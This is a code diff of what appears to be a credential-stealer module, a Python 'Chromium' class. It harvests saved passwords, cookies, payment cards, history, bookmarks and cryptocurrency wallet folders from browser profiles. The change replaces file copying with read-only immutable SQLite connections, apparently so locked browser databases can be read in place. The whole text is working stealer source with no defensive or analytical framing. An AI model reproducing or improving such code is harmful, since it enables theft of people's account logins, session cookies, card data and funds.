@@ -1,9 +1,9 @@
+from os import chmod
 from re import compile
 from typing import Tuple
-from shutil import copyfile
 from base64 import b64decode
 from json import load, loads
-from distutils.dir_util import copy_tree
+from shutil import copyfile, copytree
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
 from sqlite3 import connect, Connection, Cursor
@@ -146,9 +146,13 @@ class Chromium:
         Returns:
         - tuple: Cursor and Connection objects.
         """
-        with connect(database) as connection:
-            connection.text_factory = lambda text: text.decode(errors="ignore")
-            cursor = connection.cursor()
+        connection = connect(
+            f"file:{database}?mode=ro&immutable=1",
+            uri=True,
+            isolation_level=None,
+            check_same_thread=False
+        )
+        cursor = connection.cursor()
 
         return cursor, connection
 
@@ -168,38 +172,33 @@ class Chromium:
 
         return data
 
-    def _copy_files(self, profile: str, storage_path: str, main_path: str, alt_path: str = None, error: str = "") -> bool:
+    def _copy_files(self, profile: str, destination_path: str, target_path: str, error: str = "") -> bool:
         """
         Copies the file/directory or prints an error if it is not found.
 
         Parameters:
         - profile [str]: Browser profile.
-        - storage_path [str]: Destination path.
-        - main_path [str]: Path of the file or directory to be copied.
-        - alt_path [str]: Spare path of the file or directory to be copied.
+        - destination_path [str]: Destination path.
+        - target_path [str]: Path of the file or directory to be copied.
         - error [str]: Error that will be displayed if the path does not exist.
 
         Returns:
         - bool: True or False depending on the success of the execution.
         """
-        if path.isfile(main_path) or (alt_path and path.isfile(alt_path)):
+        if path.isfile(target_path):
             copy = copyfile
         else:
-            copy = copy_tree
+            copy = copytree
 
-        if path.exists(main_path):
-            copy(main_path, storage_path)
-
-        elif alt_path and path.exists(alt_path):
-            copy(alt_path, storage_path)
-
+        if path.exists(target_path):
+            copy(target_path, destination_path)
         else:
             print(f'[{self.__browser_name}]: {profile} - {error}')
             return False
 
         return True
 
-    def _grab_passwords(self, profile: str, main_path: str, alt_path: str = None) -> None:
+    def _grab_passwords(self, profile: str, file_path: str) -> None:
         """
         Collects browser passwords.
 
@@ -211,17 +210,11 @@ class Chromium:
         Returns:
         - None.
         """
-        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Passwords.db")
-
-        if self._copy_files(profile, filename, main_path, alt_path, "No passwords found") is False:
-            return
-
-        cursor, connection = self._get_db_connection(filename)
+        cursor, connection = self._get_db_connection(file_path)
         passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()
 
         cursor.close()
         connection.close()
-        remove(filename)
 
         if not passwords_list:
             return
@@ -237,7 +230,7 @@ class Chromium:
 
         passwords.close()
 
-    def _grab_cookies(self, profile: str, main_path: str, alt_path: str = None) -> None:
+    def _grab_cookies(self, profile: str, file_path: str) -> None:
         """
         Collects browser cookies.
 
@@ -249,17 +242,11 @@ class Chromium:
         Returns:
         - None.
         """
-        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cookies.db")
-
-        if self._copy_files(profile, filename, main_path, alt_path, "No cookies found") is False:
-            return
-
-        cursor, connection = self._get_db_connection(filename)
+        cursor, connection = self._get_db_connection(file_path)
         cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()
 
         cursor.close()
         connection.close()
-        remove(filename)
 
         if not cookies_list:
             return
@@ -277,7 +264,7 @@ class Chromium:
 
         cookies.close()
 
-    def _grab_cards(self, profile: str, main_path: str, alt_path: str = None) -> None:
+    def _grab_cards(self, profile: str, file_path: str) -> None:
         """
         Collects browser cards.
 
@@ -289,17 +276,11 @@ class Chromium:
         Returns:
         - None.
         """
-        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cards.db")
-
-        if self._copy_files(profile, filename, main_path, alt_path, "No cards found") is False:
-            return
-
-        cursor, connection = self._get_db_connection(filename)
+        cursor, connection = self._get_db_connection(file_path)
         cards_list = cursor.execute(self.__config.CardsSQL).fetchall()
 
         cursor.close()
         connection.close()
-        remove(filename)
 
         if not cards_list:
             return
@@ -315,7 +296,7 @@ class Chromium:
 
         cards.close()
 
-    def _grab_history(self, profile: str, main_path: str, alt_path: str = None) -> None:
+    def _grab_history(self, profile: str, file_path: str) -> None:
         """
         Collects browser history.
 
@@ -327,18 +308,12 @@ class Chromium:
         Returns:
         - None.
         """
-        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} History.db")
-
-        if self._copy_files(profile, filename, main_path, alt_path, "No history found") is False:
-            return
-
-        cursor, connection = self._get_db_connection(filename)
+        cursor, connection = self._get_db_connection(file_path)
         results = cursor.execute(self.__config.HistorySQL).fetchall()
         history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]
 
         cursor.close()
         connection.close()
-        remove(filename)
 
         if not results:
             return
@@ -354,7 +329,7 @@ class Chromium:
 
         history.close()
 
-    def _grab_bookmarks(self, profile: str, main_path: str, alt_path: str = None) -> None:
+    def _grab_bookmarks(self, profile: str, file_path: str) -> None:
         """
         Collects browser bookmarks.
 
@@ -368,7 +343,7 @@ class Chromium:
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Bookmarks")
 
-        if self._copy_files(profile, filename, main_path, alt_path, "No bookmarks found") is False:
+        if self._copy_files(profile, filename, file_path, "No bookmarks found") is False:
             return
 
         file = self._get_file(filename)
@@ -447,7 +422,7 @@ class Chromium:
             try:
 
                 filename = path.join(self.__path, rf'{profile} {wallet["name"]}')
-                self._copy_files(profile, filename, path.join(wallets, wallet["folder"]), error=f'No {wallet["name"]} found')
+                self._copy_files(profile, filename, path.join(wallets, wallet["folder"]), f'No {wallet["name"]} found')
 
             except Exception as e:
                 print(f"[{self.__browser_name}]: {repr(e)}")
@@ -466,27 +441,27 @@ class Chromium:
         functions = [
             {
                 "method": self._grab_passwords,
-                "arguments": [profile_name, path.join(profile, "Login Data"), None],
+                "arguments": [profile_name, path.join(profile, "Login Data")],
                 "status": True if Features.passwords in self.__statuses else False
             },
             {
                 "method": self._grab_cookies,
-                "arguments": [profile_name, path.join(profile, "Cookies"), path.join(profile, "Network", "Cookies")],
+                "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
                 "status": True if Features.cookies in self.__statuses else False
             },
             {
                 "method": self._grab_cards,
-                "arguments": [profile_name, path.join(profile, "Web Data"), None],
+                "arguments": [profile_name, path.join(profile, "Web Data")],
                 "status": True if Features.cards in self.__statuses else False
             },
             {
                 "method": self._grab_history,
-                "arguments": [profile_name, path.join(profile, "History"), None],
+                "arguments": [profile_name, path.join(profile, "History")],
                 "status": True if Features.history in self.__statuses else False
             },
             {
                 "method": self._grab_bookmarks,
-                "arguments": [profile_name, path.join(profile, "Bookmarks"), None],
+                "arguments": [profile_name, path.join(profile, "Bookmarks")],
                 "status": True if Features.bookmarks in self.__statuses else False
             },
             {
